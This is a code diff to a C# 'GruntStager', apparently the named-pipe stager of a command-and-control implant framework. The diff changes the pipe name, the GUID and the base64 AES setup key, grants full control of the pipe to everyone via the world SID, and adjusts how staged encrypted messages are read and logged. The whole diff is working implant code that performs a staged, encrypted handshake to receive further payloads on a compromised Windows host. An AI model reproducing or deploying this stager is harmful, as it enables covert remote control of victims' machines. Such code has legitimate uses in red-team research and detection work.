@@ -8,6 +8,8 @@ using System.IO.Pipes;
 using System.IO.Compression;
 using System.Reflection;
 using System.Collections.Generic;
+using System.Security.Principal;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 
 namespace GruntStager
@@ -41,11 +43,11 @@ namespace GruntStager
         // Hello World! {0}
     </body>
 </html>".Replace(Environment.NewLine, "\n");
-                string PipeName = @"gruntsvc1";
+                string PipeName = @"gruntsvc06";
 
-                string aGUID = @"5d93f1237d";
+                string aGUID = @"fa3b49f6dc";
                 string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
-                byte[] SetupKeyBytes = Convert.FromBase64String(@"SIPkLS3ME3Y6NOnV5oIZxeYQBH5mc4DRl8EFp7C58Rk=");
+                byte[] SetupKeyBytes = Convert.FromBase64String(@"u7ef+5dMYM5aE5EWitQkFe5sFApg4R5IUSqsDssDTSw=");
                 string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
 
                 Aes SetupAESKey = Aes.Create();
@@ -65,13 +67,13 @@ namespace GruntStager
                 NamedPipeServerStream pipe = null;
                 string Stage0Response = "";
                 PipeSecurity ps = new PipeSecurity();
-                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                 pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 pipe.WaitForConnection();
                 System.Threading.Thread.Sleep(5000);
                 var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage0Bytes);
-                Stage0Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage0Response = Encoding.UTF8.GetString(Read(pipe));
                 string extracted = Parse(Stage0Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
@@ -101,8 +103,9 @@ namespace GruntStager
 
                 string Stage1Response = "";
                 var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
+                Console.WriteLine("Stage 1");
                 Write(pipe, Stage1Bytes);
-                Stage1Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage1Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage1Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -129,8 +132,9 @@ namespace GruntStager
 
                 string Stage2Response = "";
                 var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
+                Console.WriteLine("Stage 2");
                 Write(pipe, Stage2Bytes);
-                Stage2Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage2Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage2Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -150,9 +154,7 @@ namespace GruntStager
                     , pipe
                     , PipeName);
             }
-            catch (Exception e) { 
-                Console.Error.WriteLine(e.Message); 
-            }
+            catch (Exception e) { Console.Error.WriteLine(e.Message); }
         }
 
         public static void Write(PipeStream pipe, byte[] bytes)
